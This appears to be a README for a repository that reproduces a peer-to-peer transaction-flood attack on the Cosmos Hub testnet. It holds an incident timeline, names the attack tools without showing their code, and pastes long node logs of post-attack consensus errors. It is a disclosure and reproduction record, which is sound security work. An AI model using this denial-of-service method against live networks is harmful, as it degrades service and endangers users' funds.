# Spammy

## Timeline

* 2021, Sept 
  * Issue first noticed on sentinel
* 2022, May 
  * Issue occurs on Luna Classic, accelerating the loss of billions in user funds
  * Today, notably, Luna2 has a block size of 1MB and Terraform Labs confirmed that it is due to this
* 2023, August 15 
  * Issue occurs on Stride and Notional begins to investigate with suport from a broad group of teams.
* 2023, Sept 25 
  * Notional Labs reproduces the issue on the cosmos hub replicated security testnet with the explicit approval of Hypha
* 2023, Sept 26
  * Notional labs has accelerated the attack
  * RS testnet blocks last 38 seconds each
  * Notional labs discontinues the attack on the RS testnet
* 2023, Sept 27
  * The network continues to experience degraded performance
  * Validator mempools remain [full](./mempoolcryptocrew.json) 
  * Block times are stil [7.9 seconds on average](./screenshots/hub-testnet/current-09-27_19-55-05.jpg), representing a service degredation of 33%
  * Full validator mempools could reduce access to the network for users
  * Network hasn't been attacked for over 18 hours


## Tooling and documentation for the reproduction of:

* banana king
* client update spam
* banana client

In an effort to reporoduce a p2p storm on the cosmos hub testnet. 


### it has been reproduced

Attack stopped about 6:50pm.  These are its echoes and echoes are what a p2p flood is. 

```log
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
```

```log
7:10PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"B863A48E286629C0D6625FAB8528B5E6D22B2AEE1009FF8BFB366C74C4A02C3F","total":1} height=3393463 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"11645810029DC234A9CAFDCF7AF9968AFD8E9E7455E05CABC8B9A5D525B058C5","total":336}
7:10PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"B863A48E286629C0D6625FAB8528B5E6D22B2AEE1009FF8BFB366C74C4A02C3F","total":1} height=3393463 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"11645810029DC234A9CAFDCF7AF9968AFD8E9E7455E05CABC8B9A5D525B058C5","total":336}
7:10PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"B863A48E286629C0D6625FAB8528B5E6D22B2AEE1009FF8BFB366C74C4A02C3F","total":1} height=3393463 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"11645810029DC234A9CAFDCF7AF9968AFD8E9E7455E05CABC8B9A5D525B058C5","total":336}
7:10PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"B863A48E286629C0D6625FAB8528B5E6D22B2AEE1009FF8BFB366C74C4A02C3F","total":1} height=3393463 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"11645810029DC234A9CAFDCF7AF9968AFD8E9E7455E05CABC8B9A5D525B058C5","total":336}
7:10PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"B863A48E286629C0D6625FAB8528B5E6D22B2AEE1009FF8BFB366C74C4A02C3F","total":1} height=3393463 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"11645810029DC234A9CAFDCF7AF9968AFD8E9E7455E05CABC8B9A5D525B058C5","total":336}
```


```log
7:14PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"F02F78087B025950BD20CB240EA1920AF0CA9F30365F3B049E6B04E4C1BFF8D2","total":1} height=3393494 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"6518FA96551CFF70AE6B2141A29A6D14DAE08841B9760A97B75887E7775E9FC6","total":336}
7:14PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"F02F78087B025950BD20CB240EA1920AF0CA9F30365F3B049E6B04E4C1BFF8D2","total":1} height=3393494 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"6518FA96551CFF70AE6B2141A29A6D14DAE08841B9760A97B75887E7775E9FC6","total":336}
7:14PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"F02F78087B025950BD20CB240EA1920AF0CA9F30365F3B049E6B04E4C1BFF8D2","total":1} height=3393494 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"6518FA96551CFF70AE6B2141A29A6D14DAE08841B9760A97B75887E7775E9FC6","total":336}
7:14PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"F02F78087B025950BD20CB240EA1920AF0CA9F30365F3B049E6B04E4C1BFF8D2","total":1} height=3393494 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"6518FA96551CFF70AE6B2141A29A6D14DAE08841B9760A97B75887E7775E9FC6","total":336}
7:14PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"F02F78087B025950BD20CB240EA1920AF0CA9F30365F3B049E6B04E4C1BFF8D2","total":1} height=3393494 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"6518FA96551CFF70AE6B2141A29A6D14DAE08841B9760A97B75887E7775E9FC6","total":336}
7:14PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"F02F78087B025950BD20CB240EA1920AF0CA9F30365F3B049E6B04E4C1BFF8D2","total":1} height=3393494 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"6518FA96551CFF70AE6B2141A29A6D14DAE08841B9760A97B75887E7775E9FC6","total":336}
7:14PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"F02F78087B025950BD20CB240EA1920AF0CA9F30365F3B049E6B04E4C1BFF8D2","total":1} height=3393494 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"6518FA96551CFF70AE6B2141A29A6D14DAE08841B9760A97B75887E7775E9FC6","total":336}
7:14PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"F02F78087B025950BD20CB240EA1920AF0CA9F30365F3B049E6B04E4C1BFF8D2","total":1} height=3393494 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"6518FA96551CFF70AE6B2141A29A6D14DAE08841B9760A97B75887E7775E9FC6","total":336}
```

```log
7:16PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"584791C409D4AEEF336FDB1C8C7E6D1AAC32383EF6B5B6FEF974450CC0F45BE6","total":1} height=3393506 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"4C21C9F38AB822E5004FFD5D55D34E21ED4F8E1439C2FE725F8CA11F1BF73A26","total":336}
7:16PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"584791C409D4AEEF336FDB1C8C7E6D1AAC32383EF6B5B6FEF974450CC0F45BE6","total":1} height=3393506 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"4C21C9F38AB822E5004FFD5D55D34E21ED4F8E1439C2FE725F8CA11F1BF73A26","total":336}
7:16PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"584791C409D4AEEF336FDB1C8C7E6D1AAC32383EF6B5B6FEF974450CC0F45BE6","total":1} height=3393506 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"4C21C9F38AB822E5004FFD5D55D34E21ED4F8E1439C2FE725F8CA11F1BF73A26","total":336}
7:16PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"584791C409D4AEEF336FDB1C8C7E6D1AAC32383EF6B5B6FEF974450CC0F45BE6","total":1} height=3393506 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"4C21C9F38AB822E5004FFD5D55D34E21ED4F8E1439C2FE725F8CA11F1BF73A26","total":336}
7:16PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"584791C409D4AEEF336FDB1C8C7E6D1AAC32383EF6B5B6FEF974450CC0F45BE6","total":1} height=3393506 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"4C21C9F38AB822E5004FFD5D55D34E21ED4F8E1439C2FE725F8CA11F1BF73A26","total":336}
7:16PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"584791C409D4AEEF336FDB1C8C7E6D1AAC32383EF6B5B6FEF974450CC0F45BE6","total":1} height=3393506 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"4C21C9F38AB822E5004FFD5D55D34E21ED4F8E1439C2FE725F8CA11F1BF73A26","total":336}
7:16PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"584791C409D4AEEF336FDB1C8C7E6D1AAC32383EF6B5B6FEF974450CC0F45BE6","total":1} height=3393506 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"4C21C9F38AB822E5004FFD5D55D34E21ED4F8E1439C2FE725F8CA11F1BF73A26","total":336}
7:16PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"584791C409D4AEEF336FDB1C8C7E6D1AAC32383EF6B5B6FEF974450CC0F45BE6","total":1} height=3393506 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"4C21C9F38AB822E5004FFD5D55D34E21ED4F8E1439C2FE725F8CA11F1BF73A26","total":336}
7:16PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"584791C409D4AEEF336FDB1C8C7E6D1AAC32383EF6B5B6FEF974450CC0F45BE6","total":1} height=3393506 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"4C21C9F38AB822E5004FFD5D55D34E21ED4F8E1439C2FE725F8CA11F1BF73A26","total":336}
```

above are from the hub testnet today, 9/26/2023

This is also still observable a day later, 9/27/2023

```log
2:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=08ec17e86dac67b9da70deb20177655495a55407 round=0
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"CFC35F0913554614947F24C40B1DBC1E9A1F78C74EF50318FC4FA99B006986F5","total":1} height=3401482 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"448BDFA817C0E18F15BF6B9FE5ED7DD34447A6DA1507008AF6C87B6191F32F2B","total":336}
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
12:24PM INF failed attempting to add vote err="expected 3401482/1/2, but got 3401482/0/2: unexpected step" module=consensus
12:24PM ERR failed to process message err="error adding vote" height=3401483 module=consensus msg_type=*consensus.VoteMessage peer=328e0627172add338f6aed08600098a9308dc52d round=0
